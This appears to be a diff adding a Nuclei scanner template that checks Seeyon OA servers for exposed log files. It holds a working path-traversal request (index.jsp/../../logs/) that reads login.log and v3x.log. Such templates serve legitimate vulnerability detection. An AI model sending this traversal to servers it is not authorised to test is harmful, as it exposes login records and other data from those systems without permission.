@@ -1,0 +1,55 @@
+id: seeyon-a8-log-info-leak
+info:
+  name: Seeyon OA Logs Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+  description: |
+    This template checks for Seeyon OA logs information leakage. It attempts to access
+    known log files and verifies if the response contains log data patterns.
+
+variables:
+  log_files:
+    - login.log
+    - v3x.log
+
+http:
+  - raw:
+      - |
+        GET /seeyon/management/index.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Management"
+        part: body
+
+  - raw:
+      - |
+        GET /seeyon/management/index.jsp/../../logs/{{log_file}} HTTP/1.1
+        Host: {{Hostname}}
+
+    attack: pitchfork
+    payloads:
+      log_file:
+        - '{{log_files}}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - '^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}'
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
